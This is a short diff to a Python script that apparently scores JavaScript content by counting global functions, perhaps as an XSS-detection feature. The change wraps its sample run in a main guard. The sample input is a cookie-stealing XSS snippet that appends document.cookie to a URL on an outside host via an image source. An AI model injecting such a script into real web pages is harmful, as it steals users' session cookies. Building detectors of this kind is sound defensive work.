@@ -23,11 +23,12 @@ def calculate_score(js_content: str) -> int:
     return total_count
 
 
-js_content = """
-<script language="javascript">
-var url = "http://www.trusted.com/index.html?cookie=";
-url = url + encodeURI(document.cookie);
-document.getElementById("pic").src=url;</script>
-"""
-res = calculate_score(js_content)
-print(f"js global functions count:{res}")
+if __name__ == "__main__":
+    js_content = """
+    <script language="javascript">
+    var url = "http://www.trusted.com/index.html?cookie=";
+    url = url + encodeURI(document.cookie);
+    document.getElementById("pic").src=url;</script>
+    """
+    res = calculate_score(js_content)
+    print(f"js global functions count:{res}")
